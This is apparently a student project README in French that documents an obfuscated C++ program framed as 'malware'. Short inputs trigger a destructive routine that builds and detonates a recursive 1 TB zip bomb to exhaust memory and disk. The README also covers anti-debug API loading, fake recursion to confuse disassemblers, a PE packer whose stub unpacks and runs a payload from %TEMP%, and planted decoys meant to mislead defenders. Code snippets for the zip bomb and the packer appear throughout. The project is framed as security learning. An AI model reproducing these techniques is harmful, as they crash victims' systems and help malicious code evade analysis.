# Fonctions Principales du Projet Malware du groupe 3 : Ewan Decima, Garance Frolla et Ely Marthouret

Nous avons décidé de faire un goodware et d'obfuscer son fonctionnement

---

## Table des matières

1. [MaliciousEcho](#maliciousecho)
2. [Custom](#custom)
3. [Devil](#devil)
4. [Dépendances](#dependances)
5. [Le Packer](#packer)
6. [Responsabilité](#responsabilité)

---

## 1. MaliciousEcho - Fonction de routage

Point d'entrée principal qui **route l'exécution** vers deux chemins différents selon la longueur de la chaîne d'entrée :
- Si la chaîne est **valide** (≥ 8 caractères) → appelle `custom_func` -> si les conditions sont remplies elle affiche str donc c'est un goodware
- Si la chaîne est **invalide** (< 8 caractères) → appelle `devil_code`

### Signature
```cpp
template <typename F, typename G>
int malicious_echo(const std::string& str, F devil_code, G custom_func)
```

### Paramètres
- **`str`** : Chaîne d'entrée à valider
- **`devil_code`** : Fonction callback appelée en cas d'échec de validation (chaîne trop courte)
- **`custom_func`** : Fonction callback appelée en cas de succès de validation

### Exemple d'utilisation
```cpp
malicious_echo("short", devil_wrapper, custom);     // Chaîne < 8 → appelle devil()
malicious_echo("valid_string_test", devil_wrapper, custom);  // Chaîne ≥ 8 → appelle custom()
```

---

## 2. Custom - Fonction de validation cryptographique


Fonction de **validation cryptographique** avec détection de débogueur qui :
1. Détecte si un débogueur est présent
2. Si débogueur → **obfuscation** avec fake recursion
3. Sinon → **chiffrement + triple hashing** pour valider un secret

### Signature
```cpp
void custom(const std::string& str)
```

### Constantes secrètes
```cpp
const std::string HASH = "496bb7cdfa1a478b66289234332955e5f2e93f113207af12af4bbe2cdba345c9";
const std::string SALT = "-90hZ4if?9AwL29F&b";
const std::string WIN_MESSAGE = "V0u5_4v32_7R0UVé_l4_80nn3_Clé_8r4V0?!";
```

### Fonctionnement

#### **Branche 1 : Débogueur détecté** 
```cpp
if (debug) {
    // Obfuscation avec fake recursion (10 itérations de factorielle)
    int i = fake_recursive(10, make_wrapper(&factoriel), 10);
    if (i < 0) {
        std::cout << i << std::endl;
    }
    std::cout << str << std::endl;  // Affiche simplement la chaîne
}
```

**Techniques anti-debug utilisées** :
-  `LoadIsDebuggerPresentFunction()` - Chargement dynamique de `IsDebuggerPresent()`
-  `LoadPrintfFunction()` - Chargement dynamique de `printf` pour l'affichage.
-  `fake_recursive()` - Obfuscation par fausse récursion
-  `compose_n_times()` - Ralentissement de l'exécution

#### **Branche 2 : Pas de débogueur** 

```
┌──────────────────────────┐
│  Récupère USERNAME       │
└──────────┬───────────────┘
           │
           ▼
   ┌───────────────┐
   │ USERNAME ==   │
   │    SALT ?     │
   └───────┬───────┘
           │
    ┌──────┴──────┐
   NON           OUI
    │             │
    ▼             ▼
┌─────────┐   ┌──────────────┐
│ Process │   │ Ralentit +   │
│ crypto  │   │ Affiche str  │
└────┬────┘   └──────────────┘
     │
     ▼
┌──────────────────────┐
│ Cipher(USERNAME)     │
│ encrypt(str)         │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ hash1 = hash(enc)    │
│ hash2 = hash(hash1)  │
│ hash3 = hash(hash2)  │
└──────┬───────────────┘
       │
       ▼
   ┌─────────────┐
   │ hash3 ==    │
   │   HASH ?    │
   └─────┬───────┘
         │
    ┌────┴────┐
   OUI       NON
    │         │
    ▼         ▼
┌─────────┐ ┌──────────┐
│ Affiche │ │ Affiche  │
│ WIN_MSG │ │   str    │
└─────────┘ └──────────┘
```

**Algorithme cryptographique** :
1. **Récupération de la clé** : `USERNAME` de l'environnement Windows
2. **Chiffrement XOR** : `encrypted = Cipher(USERNAME).encrypt(str)`
3. **Triple hashing** :
4. **Comparaison** : Si `toHexString(hash3) == HASH` → **Victoire (en fait c'est un hash impossible par sa longueur)**

### Techniques d'obfuscation
- **Anti-debug** : Détection via `IsDebuggerPresent()`
- **Chargement dynamique de `IsDebuggerPresent`** : La fonction n'est pas importée statiquement. Le nom "IsDebuggerPresent" est déchiffré à l'exécution en utilisant le nom d'utilisateur (`USERNAME`) comme clé, puis l'adresse est récupérée via `GetProcAddress` dans `kernel32.dll`.
- **Chargement dynamique de `Printf`** : Pour masquer l'utilisation de fonctions d'affichage standard, `printf` est chargé dynamiquement depuis `msvcrt.dll`. Son nom est déchiffré en utilisant **l'architecture du processeur** (par exemple "x64" ou "x86") comme clé de déchiffrement.
- **Fake recursion** : `fake_recursive(10, factoriel, 10)` pour brouiller l'analyse statique
- **Composition** : `compose_n_times(&factoriel, 10-12, 10)` pour ralentir l'exécution
- **Chiffrement dynamique** : Clé basée sur `USERNAME` (spécifique à chaque machine)


---

## 3. Devil - Fonction destructrice


### Objectif
Fonction **destructrice** qui exécute trois actions malveillantes en séquence :
1.  **Rickroll** - Animation ASCII
2.  **Zipbomb** - Création d'une bombe zip de 1 TB
3.  **Détonation** - Décompression de la zipbomb (saturation disque)

###  Code
```cpp
void devil() {
    // 1. Rickroll
    roll(100);
    
    // 2. Creation de la zipbomb
    const char* filename = "devil_zipbomb.bin";
    create_zipbomb(filename, 1024 * 1024, 10);  // 1 TO (1024 GB), 10 niveaux
    
    // 3. Decompression de la zipbomb
    detonate_zipbomb(filename, 10, 1024 * 1024);
}
```

###  Étapes détaillées

#### **Étape 1 : Rickroll** 🎵
```cpp
roll(100);  // 100ms de délai entre frames
```

**Fonctionnalités** :
- Affiche **149 frames** d'animation ASCII de Rick Astley
- Sur Windows : ouvre un **nouveau terminal** via `cmd /k`
- Utilise `Sleep()` (Windows) ou `clock()` (portable) pour les délais
- Efface l'écran entre chaque frame (`cls` / `clear`)


#### **Étape 2 : Création de zipbomb** 
```cpp
create_zipbomb("devil_zipbomb.bin", 1024 * 1024, 10);
```

**Paramètres** :
- **Taille** : `1024 * 1024` MB = **1 TÉRAOCTET** (1 TB)
- **Niveaux** : `10` niveaux de compression récursive
- **Fichier** : `devil_zipbomb.bin`

**Principe** :
- Crée un fichier zip compressé de quelques KB
- Une fois décompressé, génère **1 TB de données**
- Compression récursive : ZIP dans ZIP dans ZIP... (10 fois)

#### **Étape 3 : Détonation** 
```cpp
detonate_zipbomb("devil_zipbomb.bin", 10, 1024 * 1024);
```

**Action destructrice** :
- Décompresse **récursivement** les 10 niveaux
- Écrit **1 To** de données sur le disque
- Sature le disque dur
- Peut faire **Crasher** le systeme (out of memory, disk full)

---

## 4. Schéma de flux global

```
                    ┌────────────────────────┐
                    │   malicious_echo(str)  │
                    └───────────┬────────────┘
                                │
                    ┌───────────┴───────────┐
                    │  Validation longueur  │
                    │    str.length() >= 8  │
                    └───────────┬───────────┘
                                │
                    ┌───────────┴───────────┐
                    │                       │
                  ÉCHEC                  SUCCÈS
               (str < 8)              (str ≥ 8)
                    │                       │
                    ▼                       ▼
        ┌─────────────────────┐  ┌──────────────────────┐
        │      devil()        │  │      custom(str)     │
        └──────────┬──────────┘  └──────────┬───────────┘
                   │                        │
        ┌──────────┼──────────┐             │
        │          │          │             ▼
        ▼          ▼          ▼   ┌─────────────────────┐
    ┌──────┐  ┌────────┐  ┌──────┐│ IsDebuggerPresent() │
    │ Rick │  │Zipbomb │  │Detone││                     │
    │ roll │  │Create  │  │      │└──────────┬──────────┘
    └──────┘  └────────┘  └──────┘           │
                                   ┌─────────┴─────────┐
                                   │                   │
                                 DEBUG              NO DEBUG
                                   │                   │
                                   ▼                   ▼
                        ┌──────────────────┐  ┌─────────────────┐
                        │  fake_recursive  │  │   Encryption +  │
                        │   (obfuscation)  │  │  Triple Hash    │
                        │                  │  │                 │
                        │  Affiche str     │  │  Vérification   │
                        └──────────────────┘  │  secret         │
                                              └────────┬────────┘
                                                       │
                                              ┌────────┴────────┐
                                              │                 │
                                           MATCH            NO MATCH
                                              │                 │
                                              ▼                 ▼
                                    ┌──────────────┐   ┌──────────┐
                                    │ WIN_MESSAGE  │   │Affiche str
                                                        echo normal│
                                    │              │   └──────────┘
                                    └──────────────┘
                                           
```

---

## Dépendances techniques


### `Cipher` : Chiffrement XOR avec clé


### `custom_hash` : Fonction de hashing personnalisée

Le hash est un hash personnalisé, voici son fonctionnement : 
**Input**

La fonction custom_hash accepte soit une chaîne C++ standard (std::string), soit un C-string (const char).
Lorsque l’entrée est un const char nul, la fonction retourne directement la valeur 0.
Dans tous les autres cas, la chaîne est traitée caractère par caractère, chaque caractère étant interprété comme un octet non signé pour éviter les effets indésirables liés au signe.

Transformation

L’algorithme commence avec une valeur de départ égale à 5381, valeur traditionnelle dans l’algorithme DJB2.
Chaque caractère entraîne alors une succession d’opérations destinées à diffuser l’information de manière progressive :

La première étape consiste à multiplier la valeur de hachage courante par 33. Cette opération, héritée de DJB2, augmente rapidement la dispersion des valeurs.
Le caractère courant est ensuite ajouté directement à la valeur de hachage, ce qui introduit son influence brute dans l’état interne.

Une phase de mélange conditionnel est appliquée selon que la position du caractère (index) est paire ou impaire.
Pour les indices pairs, la valeur est soumise à une rotation circulaire vers la gauche de 7 bits, puis mélangée par un opérateur XOR avec le caractère décalé vers la gauche.
Pour les indices impairs, la valeur subit plutôt une rotation vers la droite de 5 bits, suivie d’un XOR avec le caractère décalé vers la droite.
Les rotations sont effectuées de manière circulaire, ce qui signifie que les bits sortants d’un côté sont réinjectés de l’autre, assurant ainsi une diffusion homogène sur tout le mot de 32 bits.

Une constante fixe (0xDEADBEEF) est ensuite mélangée via un XOR. Cette étape agit comme une perturbation supplémentaire destinée à réduire les motifs répétitifs et à renforcer l’effet avalanche.

L’ensemble de ces opérations, répétées pour chaque caractère, garantit qu’une petite variation dans la chaîne d’entrée produit une grande variation dans le résultat final.

**Output**

La fonction retourne un entier non signé de 32 bits.
Le résultat est déterministe pour une même entrée mais extrêmement sensible à la moindre modification, y compris la casse ou la position d’un caractère.
Cette fonction est adaptée aux structures de données nécessitant un hachage rafﬁné (comme les tables de hachage) mais n’a pas vocation à fournir une sécurité cryptographique. 



### `fake_recursive` : Obfuscation avec du rien
Prend une fonction f, ses arguments et un entier x, fait tourner x fois f(arg) puis renvoie f(arg)
Utilise un wrapper pour être plus universelle en fonction du type de retour
**Objectif** : Remplir IDA de fausses recursion


### `compose_n_times` : Composition de fonctions
Cette fonction implémente la composition f(f(...f(arg)...)) en utilisant la récursivité.
 Elle suppose que le résultat de f(arg) a le même type que l'argument 'arg' pour que la composition puisse continuer.
 Prend en argument :
Type de la fonction (pointeur de fonction ou foncteur)
Type de l'argument initial
La fonction à appliquer
Le nombre d'appels à effectuer
arg L'argument initial
 Et return Le résultat final de la composition.
 **Objectif** : Remplir IDA de fausses recursion ou faire un compose legitime

### `LoadIsDebuggerPresentFunction` : Chargement dynamique d'API Windows

**Objectif** : Charger dynamiquement `IsDebuggerPresent()` de manière obfusquée pour éviter la détection statique.

**Fonctionnement** :
1. **Chargement dynamique de kernel32.dll** :
   ```cpp
   HMODULE kernel32 = LoadLibraryA("kernel32.dll");
   ```
   - Charge la DLL Windows contenant les fonctions système

2. **Déchiffrement du nom de la fonction** :
   - Le nom "IsDebuggerPresent" n'apparaît **jamais en clair** dans le code
   - Stocké sous forme de bytes chiffrés : `{0x10, 0x33, 0xf3, 0x05, 0x38, 0xf3}`
   - Récupère le `USERNAME` comme clé de déchiffrement
   - Utilise `Cipher` pour déchiffrer : `decryptBytes(encryptedBytes)`
   - Résultat : chaîne "IsDebuggerPresent" en mémoire uniquement

3. **Récupération de l'adresse de la fonction** :
   ```cpp
   type_IsDebuggerPresent func = (type_IsDebuggerPresent)GetProcAddress(kernel32, functionName.c_str());
   ```
   - `GetProcAddress()` retourne un pointeur vers la fonction
   - Cast en `type_IsDebuggerPresent` (typedef de pointeur de fonction)

4. **Retourne le pointeur** :
   - Peut être appelé comme une fonction normale : `func()`
   - Retourne `BOOL` : `TRUE` si débogueur détecté, `FALSE` sinon

**Avantages de cette technique** :
-  **Anti-détection statique** : Le nom "IsDebuggerPresent" n'apparaît pas dans les strings du binaire
-  **Anti-analyse** : Nécessite de connaître le USERNAME pour déchiffrer
-  **Obfuscation** : Les outils d'analyse automatique ne détectent pas l'appel à IsDebuggerPresent

### `Cipher` : Chiffrement XOR avec clé étendue

**Algorithme** : Chiffrement XOR symétrique avec génération de clé étendue

**Principe de base** :
```
texte_chiffré[i] = texte_clair[i] XOR clé_étendue[i]
texte_clair[i] = texte_chiffré[i] XOR clé_étendue[i]  (déchiffrement identique)
```

**Génération de la clé étendue** :

La clé fournie (ex: USERNAME) est trop courte pour chiffrer de longs messages. La fonction `generateExtendedKey()` crée une clé de la longueur exacte des données :

```cpp
Pour chaque position i dans les données :
    1. base = key[i % keyLen]           // Répétition cyclique de la clé
    2. transform = (i / keyLen) & 0xFF  // Valeur dépendant de la position
    3. mixed = base XOR transform       // Mélange initial
    4. mixed = ROL(mixed, 3)            // Rotation circulaire de 3 bits (diffusion)
    5. mixed = mixed XOR ((i XOR keyLen) & 0xFF)  // Second mélange
    6. clé_étendue[i] = mixed
```

**Exemple** :
```
Clé originale : "USER" (4 bytes)
Message : "Hello World" (11 bytes)

Génération clé étendue (11 bytes) :
Position 0: 'U' XOR 0 → rotation → mélange → K₀
Position 1: 'S' XOR 0 → rotation → mélange → K₁
Position 2: 'E' XOR 0 → rotation → mélange → K₂
Position 3: 'R' XOR 0 → rotation → mélange → K₃
Position 4: 'U' XOR 1 → rotation → mélange → K₄  (différent de K₀ !)
...
```

**Chiffrement** :
```cpp
encrypted[i] = message[i] XOR extendedKey[i]
```

**Caractéristiques** :
-  **Symétrique** : même fonction pour chiffrer et déchiffrer
-  **Rapide** : simple opération XOR
-  **Clé variable** : accepte n'importe quelle longueur de clé
-  **Non-répétitif** : même si la clé de base se répète, la clé étendue varie à chaque position
-  **Sécurité** : Résiste à l'analyse fréquentielle mais pas cryptographiquement sûr (non recommandé pour des secrets critiques)

**Encodages supportés** :
- **PLAIN** : Clé en texte clair
- **BASE64** : Clé encodée en Base64 (ex: "VVNFUg==")
- **BASE32** : Clé encodée en Base32 (ex: "KVXUWZQ=")

### `roll()` : Animation rickroll 
Affiche les images du rickroll en ASCII (juste trèès long)

### `create_zipbomb()` : Génération de zipbomb compressée

**Principe** : Créer un petit fichier qui, une fois décompressé, produit une quantité massive de données.

**Algorithme** :

```cpp
void create_zipbomb(const char* filename, unsigned long size_mb, int levels)
```

**Étapes** :

1. **Création des données initiales** :
   ```cpp
   const unsigned long total_size = size_mb * 1024 * 1024;  // Conversion MB → bytes
   std::vector<unsigned char> data(total_size, 0);           // Rempli de zéros
   ```
   - Crée un vecteur rempli de zéros (données hautement compressibles)
   - Pour 1 TB : `1024 * 1024 MB = 1,099,511,627,776 bytes`

2. **Première compression** (niveau 0 → 1) :
   ```cpp
   std::vector<unsigned char> compressed = Compressor::compress(data, 9);
   ```
   - Utilise zlib avec niveau de compression maximum (9)
   - Les zéros se compressent à un ratio ~1000:1
   - Exemple : 1 GB → ~1 MB

3. **Libération de la mémoire des données non compressées** :
   ```cpp
   data.clear();
   std::vector<unsigned char>().swap(data);  // Force la désallocation
   ```

4. **Compression récursive** (niveaux 2 à N) :
   ```cpp
   for (int level = 2; level <= levels; ++level) {
       std::vector<unsigned char> next_level = Compressor::compress(compressed, 9);
       compressed = next_level;
   }
   ```
   - Compresse les données déjà compressées
   - Chaque niveau réduit encore la taille
   - Avec 10 niveaux : données compressées 10 fois récursivement

5. **Écriture sur disque** :
   ```cpp
   std::ofstream out(filename, std::ios::binary);
   out.write(reinterpret_cast<const char*>(&compressed[0]), compressed.size());
   ```

**Fichier final** :
- Taille sur disque : **< 1 KB**
- Taille décompressée : **1 TB**
- Format : Données compressées zlib imbriquées 10 fois

**Pourquoi c'est efficace** :
-  Les zéros se compressent extrêmement bien (ratio >1000:1)
-  Compression récursive amplifie l'effet
-  Fichier minuscule qui explose en mémoire à la décompression

### `detonate_zipbomb()` : Décompression récursive

**Principe** : Décompresser récursivement les niveaux de la zipbomb jusqu'à saturation du disque/mémoire.

**Algorithme** :

```cpp
void detonate_zipbomb(const char* filename, int levels, unsigned long expected_size)
```

**Étapes** :

1. **Lecture du fichier compressé** :
   ```cpp
   std::ifstream in(filename, std::ios::binary);
   std::vector<unsigned char> compressed_data(
       (std::istreambuf_iterator<char>(in)),
       std::istreambuf_iterator<char>()
   );
   ```
   - Lit le fichier zipbomb complet en mémoire
   - Taille initiale : quelques centaines de bytes

2. **Décompression récursive par niveaux** :
   ```cpp
   std::vector<unsigned char> current = compressed_data;
   
   for (int level = levels; level >= 1; --level) {
       // Estimation de la taille après décompression
       unsigned long estimated_size = current.size() * 1000;
       if (level == 1) {
           estimated_size = expected_size;  // Taille finale (1 TB)
       }
       
       // Décompression zlib
       std::vector<unsigned char> decompressed = Compressor::decompress(current, estimated_size);
       current = decompressed;  // Prépare pour le niveau suivant
   }
   ```

**Explosion progressive** :

```
Niveau 10 (départ) : ~500 bytes (fichier sur disque)
    ↓ decompress()
Niveau 9 : ~500 KB (×1000)
    ↓ decompress()
Niveau 8 : ~500 MB (×1000)
    ↓ decompress()
Niveau 7 : ~500 GB (×1000)
    ↓ decompress()
...
Niveau 1 : 1 TB (1,099,511,627,776 bytes)
```

**Ce qui se passe** :

1. **Niveau 10 → 9** : 500 bytes → 500 KB (mémoire OK)
2. **Niveau 9 → 8** : 500 KB → 500 MB (mémoire OK)
3. **Niveau 8 → 7** : 500 MB → 500 GB (**Mémoire critique !**)
4. **Niveau 7 → 6** : Tentative d'allouer des centaines de GB
   - **Out of Memory** : Le système crashe
   - OU essaie de swapper sur disque
5. **Niveaux suivants** : 
   - Si le swap fonctionne → **saturation progressive du disque**
   - Écriture de centaines de GB de données swap
   - **Disque plein** → système inutilisable

**Mécanismes destructeurs** :

1. **Saturation RAM** :
   - Chaque décompression multiplie la taille par ~1000
   - Système tente d'allouer plusieurs GB en mémoire
   - Processus tués par OOM killer (Linux) ou crash (Windows)

2. **Saturation Disque** :
   - Si swap activé : système écrit les données en swap
   - Remplit le disque à 100%
   - Plus d'espace pour les logs, temp files, etc.

3. **Freeze système** :
   - Thrashing : système passe son temps à swapper
   - CPU à 100% pour gérer la mémoire
   - Interface graphique freeze
   - Nécessite hard reboot

**Gestion des erreurs** :
```cpp
try {
    // Décompression...
} catch (const std::exception& e) {
    // Silent - ne révèle rien sur l'échec
}
```
- Silencieux : pas de message d'erreur
- Si échec : ne fait rien (mais les dégâts peuvent déjà être faits)

**Pourquoi c'est dangereux** :
-  **Allocation exponentielle** : croissance par facteur 1000 à chaque niveau
-  **Pas de limite** : tente d'allouer toute la taille demandée
-  **Irréversible** : une fois lancé, difficile à arrêter
-  **Système non-responsive** : freeze avant même la fin

---
# Le packer

## Fonctionnement technique

### 1 Architecture globale

Le processus se déroule en 4 phases :

```
[Fichier original] → [Compression RLE] → [Chiffrement XOR] → [Injection dans stub] → [Exécutable packé]
```

### 2 Phase 1 : Lecture et validation

```cpp
bool processFile(const std::string& filePath)
```

**Actions :**
1. Lecture complète du fichier d'entrée en mémoire
2. Vérification de la signature MZ (0x5A4D) du format PE
3. Stockage dans le vecteur `inputFile`

**Validation :**
- Vérifie que le fichier est un exécutable Windows valide
- Rejette les fichiers non-PE

### 3 Phase 2 : Compression RLE

```cpp
std::vector<BYTE> compressRLE(const std::vector<BYTE>& input)
```

**Algorithme RLE (Run-Length Encoding) :**

La compression détecte les séquences répétitives de bytes identiques.

**Format de compression :**
- Séquence répétée (≥4 occurrences) : `[0xFF] [count] [byte]`
- Byte unique : `[byte]`
- Byte 0xFF isolé : `[0xFF] [0x00]`

**Exemple :**
```
Données originales : AA AA AA AA AA BB CC
Données compressées : [0xFF] [05] [AA] [BB] [CC]
```

**Optimisation :**
- Seulement les séquences de 4+ bytes identiques sont compressées
- Les séquences plus courtes restent non compressées
- Maximum 255 répétitions par séquence

### 4 Phase 3 : Chiffrement XOR

```cpp
void encryptXOR(std::vector<BYTE>& data, const uint32_t key[4])
```

**Clé de chiffrement par défaut :**
```
key[0] = 0x12345678
key[1] = 0x9ABCDEF0
key[2] = 0xFEDCBA98
key[3] = 0x87654321
```

**Algorithme :**
1. La clé 128 bits (4 × 32 bits) est convertie en 16 bytes
2. Chaque byte des données est XOR avec un byte de la clé
3. La clé est répétée cycliquement sur toute la longueur

**Formule :**
```
data[i] = data[i] XOR key[i % 16]
```

**Exemple :**
```
Données : [0x42, 0x43, 0x44, ...]
Clé :     [0x78, 0x56, 0x34, ...]
Résultat: [0x3A, 0x15, 0x70, ...]
```

### 5 Phase 4 : Structure de la section packed

```cpp
#pragma pack(push, 1)
struct PackedSection {
    DWORD magic;             // 0x4B435041 ("PACK")
    DWORD unpacked_size;     // Taille originale
    DWORD packed_size;       // Taille compressée
    DWORD key[4];            // Clé XOR (128 bits)
    // Données chiffrées suivent immédiatement
};
```

**Layout en mémoire :**
```
[Header: 24 bytes]
  ├─ Magic: 4 bytes (0x4B435041)
  ├─ Unpacked size: 4 bytes
  ├─ Packed size: 4 bytes
  └─ XOR key: 16 bytes

[Payload chiffré: packed_size bytes]
```

### 6 Phase 5 : Génération du stub

```cpp
void generateStubSource(const char* outputPath)
```

**Le stub généré contient :**

1. **Lecture de lui-même :**
    - Obtient son propre chemin via `GetModuleFileName()`
    - Mappe le fichier en mémoire (memory-mapped file)

2. **Localisation de la section .packed :**
    - Parse les headers PE (DOS + NT)
    - Recherche la section nommée ".packed"

3. **Validation :**
    - Vérifie le magic number (0x4B435041)
    - Valide les tailles

4. **Déchiffrement :**
   ```c
   void decryptXOR(unsigned char* data, DWORD size, DWORD* key)
   ```
    - Applique XOR avec la clé stockée dans le header

5. **Décompression RLE :**
   ```c
   DWORD decompressRLE(unsigned char* input, DWORD inputSize, 
                       unsigned char* output, DWORD outputSize)
   ```
    - Décode le format RLE : `[0xFF][count][byte]` → répétitions
    - Restaure les données originales

6. **Extraction temporaire :**
    - Crée un fichier dans `%TEMP%` avec extension .exe
    - Écrit l'exécutable décompressé

7. **Exécution :**
    - Lance le programme via `CreateProcess()`
    - Transmet tous les arguments de ligne de commande
    - Attend la fin du processus (`WaitForSingleObject`)
    - Supprime le fichier temporaire
    - Retourne le code de sortie du programme

### 7 Phase 6 : Compilation du stub

```cpp
bool compileStub(const std::string& stubExePath)
```

**Processus :**
1. Génère le code source C dans `%TEMP%\stub_source.c`
2. Compile avec GCC :
   ```bash
   gcc -O2 -s -o unpacker_stub.exe stub_source.c
   ```
3. Options de compilation :
    - `-O2` : Optimisation niveau 2
    - `-s` : Strip symbols (réduit la taille)
4. Vérifie que le stub a été créé correctement
5. Gère les erreurs de compilation

### 8 Phase 7 : Injection des données

```cpp
bool injectPackedData(const std::string& stubExePath,
                      const std::vector<BYTE>& packedData,
                      const std::string& outputPath)
```

**Opérations :**

1. **Lecture du stub compilé** en mémoire

2. **Modification des headers PE :**
    - Calcule l'adresse de la nouvelle section
    - Aligne sur `SectionAlignment` et `FileAlignment`

3. **Création de la section .packed :**
   ```cpp
   IMAGE_SECTION_HEADER newSection;
   memcpy(newSection.Name, ".packed", 7);
   newSection.VirtualAddress = aligned_address;
   newSection.SizeOfRawData = aligned_size;
   newSection.Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;
   ```

4. **Mise à jour des headers :**
    - Incrémente `NumberOfSections`
    - Augmente `SizeOfImage`

5. **Construction du fichier final :**
    - Headers PE modifiés
    - Sections originales du stub
    - Nouvelle section .packed avec les données
    - Padding d'alignement

6. **Écriture du fichier de sortie**

---

## 2. Structure du fichier packé

### 1 Layout global

```
┌─────────────────────────────────┐
│   Headers PE (DOS + NT)         │
├─────────────────────────────────┤
│   Section .text (code stub)     │
├─────────────────────────────────┤
│   Section .data (data stub)     │
├─────────────────────────────────┤
│   Section .rdata (imports)      │
├─────────────────────────────────┤
│   Section .packed               │
│   ┌─────────────────────────┐   │
│   │  PackedSection header   │   │
│   │  (24 bytes)             │   │
│   ├─────────────────────────┤   │
│   │  Payload chiffré/compressé  │
│   │  (packed_size bytes)    │   │
│   └─────────────────────────┘   │
└─────────────────────────────────┘
```

### 2 Alignement PE

**Section Alignment :** 4096 bytes (0x1000)
- Alignement des sections en mémoire virtuelle

**File Alignment :** 512 bytes (0x200)
- Alignement des sections sur disque

## 3. Github caché

Le packer a été fait de tel sorte à ce que si on fait strings du exe alors il y a un lien vers notre faux github qui est donné comme si un README.md avait été laissé sans faire exprès. Ce Github est faux et emmène sur de fausses pistes.
De plus un fichier .pdp qui contient plein de fausses fonctions a été laissé pour tromper les défenseurs également.



---

# Responsabilité

Ce projet est destiné à l'**apprentissage de la sécurité informatique**. Les auteurs déclinent toute responsabilité quant à l'utilisation malveillante de ce code.

**Usage autorisé** : Environnements de test isolés (VM avec snapshots)
**Usage interdit** : Systèmes de production, réseaux non autorisés

Rédigé par Garance Frolla, Ewan Decima et Ely Marthouret

---
